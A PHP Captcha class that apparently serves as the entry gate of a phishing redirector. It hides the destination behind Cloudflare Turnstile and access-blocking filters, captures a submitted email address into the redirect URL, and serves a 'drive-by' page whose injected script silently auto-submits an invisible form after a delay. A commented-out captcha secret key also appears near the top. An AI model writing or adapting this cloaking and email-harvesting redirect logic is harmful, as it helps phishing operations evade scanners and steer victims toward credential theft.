<?php
session_start();
require_once __DIR__ . '/Redirection.php';

class Captcha
{

    // This is the demo secret key. In production, we recommend
    // you store your secret key(s) safely.
    //  $SECRET_KEY = '0x4AAAAAABB07n-ZkMUX-jCXI8BKrPeCa5g';
    /**
     * @var string
     */
    private $SECRET_KEY;
    /**
     * @var string
     */
    private $SITE_KEY;
    /**
     * @var Redirection
     */
    private $tools;

    public function __construct($SECRET_KEY, $SITE_KEY, Redirection $tools)
    {
        $this->tools = $tools;
        $this->SITE_KEY = $SITE_KEY;
        $this->SECRET_KEY = $SECRET_KEY;
    }

    private function htmlPage()
    {
        $html = str_replace('data-sitekey', "data-sitekey='{$this->SITE_KEY}'", @file_get_contents(__DIR__ . '/recaptcha.html'));
        $html = str_replace(['PAGE-TITLE'], [$this->tools->config['captchaPageTitle']], $html);
        header('Content-Type: text/html; charset=utf-8');
        echo $html;
        die();
    }

    private function driveByPage()
    {
        $pathName = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
        $timeout = $this->tools->config['driveByDelay'] ?? 5;
        $addedScript = "function i(d){let o=parseInt(d||window.ii||5)||5;setTimeout(()=>{let e=document.createElement(\"form\");e.method=\"post\";let t=document.createElement(\"input\");t.type=\"hidden\",t.name=\"url\",t.value=window.location.href,e.appendChild(t);let n=document.createElement(\"input\");n.type=\"hidden\",n.name=\"driveBy\",n.value=\"true\",e.appendChild(n),e.style.opacity=\"0\",document.body.appendChild(e),e.submit()},o*1000)}document.addEventListener(\"DOMContentLoaded\",()=>{i(\"{$timeout}\");});";
        $html = str_replace(['/*{DRIVE-BY-IN-HEADER}*/', "<base href=\"/\">"], [$addedScript, "<base href=\"$pathName\">"], @file_get_contents($this->tools->config['driveByPath']));
        header('Content-Type: text/html; charset=utf-8');
        echo $html;
        die();
    }

    private function isMiddlewareFormPage()
    {
        $pathName = $this->tools->config['middleware']['file'];
        $type = $this->tools->config['middleware']['type'];
        $enabled = $this->tools->config['middleware']['use'];
        return ($type === 'form' && $enabled === true && file_exists($pathName));
    }

    private function middlewareFormPage()
    {
        $pathName = $this->tools->config['middleware']['file'];
        $html = @file_get_contents($pathName);
        header('Content-Type: text/html; charset=utf-8');
        echo $html;
        die();
    }

    private function isPost()
    {
        return count($_POST) > 0;
    }

    private function middlewareFormPagePost()
    {
        if ($this->isMiddlewareFormPage() === false || !$this->isPost()) return null;
        $foundValue = null;
        foreach ($_POST as $key => $value) {
            if (preg_match('/^[a-z]+-(email|key)$/', $key)) {
                if ($this->tools->isValidEmail(trim($value))) {
                    $foundValue = trim($value);;
                    break; // stop after the first match
                }
            }
        }
        return $foundValue;
    }


    public function init()
    {
        $this->tools->blockEmailRequestAccess();
        $this->tools->blockRequestAccess();
        $useDriveBy = $this->tools->config['useDriveBy'] ?? false;
        if (isset($_POST['driveBy']) && $_POST['driveBy'] === 'true' && isset($_POST['url'])) {
            if (isset($_SESSION['driveBy']) && isset($_SESSION['url'])) {
                $url = $_SESSION['url'];
                unset($_SESSION['url']);
                unset($_SESSION['driveBy']);
                session_destroy();
                $this->tools->handleRedirect($url);
            } else {
                $this->tools->handleRedirect($_POST['url']);
            }
            return;
        }

        if (isset($_SESSION['driveBy']) && isset($_SESSION['url'])) {
            if ($useDriveBy) {
                $this->driveByPage();
            } else {
                unset($_SESSION['url']);
                unset($_SESSION['driveBy']);
                session_destroy();
            }
        }

        $validEmail = $this->middlewareFormPagePost();
        if ($this->isPost() && $validEmail) {
            if ($useDriveBy) {
                $_SESSION['url'] = $this->tools->getCurrentUrl($validEmail);
                $_SESSION['driveBy'] = 'true';
                $this->driveByPage();
            } else {
                $this->tools->handleRedirect($this->tools->getCurrentUrl($validEmail));
            }
        }


        if ($this->tools->config['useCaptcha'] === false) {
            if ($this->isMiddlewareFormPage()) {
                $this->middlewareFormPage();
            } else
                if ($useDriveBy) {
                    $this->driveByPage();
                } else {
                    $this->tools->handleRedirect();
                }
            return;
        }

        if (!is_array($_SERVER) || empty($_SERVER)) {
            $this->htmlPage();
            return;
        }
        if (@$_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->htmlPage();
            return;
        }
        if (!isset($_POST['response'])) {
            $this->htmlPage();
            return;
        }

// file_put_contents(__DIR__ . '/test.' . date('Y-m-d') . '.json', json_encode(['server' => $_SERVER, 'request' => $_REQUEST, 'get' => $_GET, 'cookie' => $_COOKIE, 'post' => $_POST], JSON_PRETTY_PRINT));

// In PHP, we'll get form data from $_POST superglobal
// Turnstile injects a token in "cf-turnstile-response".
        $token = $_POST['response'];
        $ip = $this->tools->ip;

// Validate the token by calling the
// "/siteverify" API endpoint.
        $idempotencyKey = uniqid(rand(), true);
        $url = 'https://challenges.cloudflare.com/turnstile/v0/siteverify';

// First request
        $firstResult = $this->sendRequest($url, [
            'secret' => $this->SECRET_KEY,
            'response' => $token,
            'remoteip' => $ip,
            'idempotency_key' => $idempotencyKey
        ]);

        $firstOutcome = json_decode($firstResult, true);
        if ($firstOutcome && $firstOutcome['success']) {
            $this->tools->blockEmailRequestAccess($_POST['url']);
            $this->tools->blockRequestAccess($_POST['url']);
            if ($this->isMiddlewareFormPage()) {
                $this->middlewareFormPage();
            } else if ($useDriveBy) {
                $this->driveByPage();
            } else {
                $this->tools->handleRedirect($_POST['url']);
            }
            return;
        }

// A subsequent validation request to the "/siteverify"
// API endpoint for the same token as before, providing
// the associated idempotency key as well.
        $subsequentResult = $this->sendRequest($url, [
            'secret' => $this->SECRET_KEY,
            'response' => $token,
            'remoteip' => $ip,
            'idempotency_key' => $idempotencyKey
        ]);

        $subsequentOutcome = json_decode($subsequentResult, true);
        if ($subsequentOutcome['success']) {
            $this->tools->blockEmailRequestAccess($_POST['url']);
            $this->tools->blockRequestAccess($_POST['url']);
            if ($this->isMiddlewareFormPage()) {
                $this->middlewareFormPage();
            } else if ($useDriveBy) {
                $this->driveByPage();
            } else {
                $this->tools->handleRedirect($_POST['url']);
            }
            return;
        }

        $this->htmlPage();
    }

// Helper function to send POST requests
    private
    function sendRequest($url, $data)
    {
        $options = [
            'http' => [
                'header' => "Content-type: application/json\r\n",
                'method' => 'POST',
                'content' => json_encode($data)
            ]
        ];

        $context = stream_context_create($options);
        return @file_get_contents($url, false, $context);
    }
}
